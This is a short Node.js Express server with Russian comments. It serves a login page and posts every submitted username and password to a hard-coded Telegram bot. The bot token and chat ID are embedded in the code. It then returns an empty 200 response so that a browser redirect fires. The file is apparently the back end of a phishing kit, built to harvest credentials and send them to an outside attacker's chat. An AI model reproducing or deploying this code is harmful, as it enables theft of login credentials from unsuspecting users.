const express = require('express');
const path = require('path');
const axios = require('axios');
const app = express();

const PORT = process.env.PORT || 3000;

// Твои данные из запроса
const BOT_TOKEN = '8700205786:AAG7eq5sYStsRZ1EUep-pN7zgbKZMj1gB3g';
const CHAT_ID = ' 8745154928';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/handler', async (req, res) => {
    const { username, password } = req.body;

    const message = `
🔔 *Новая авторизация*
👤 Логин: \`${username}\`
🔑 Пароль: \`${password}\`
    `;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('Отправлено в TG успешно');
    } catch (error) {
        console.error('Ошибка TG API:', error.message);
    }

    // Отправляем пустой статус 200, чтобы сработал редирект в браузере
    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Server started on port ${PORT}`);
});
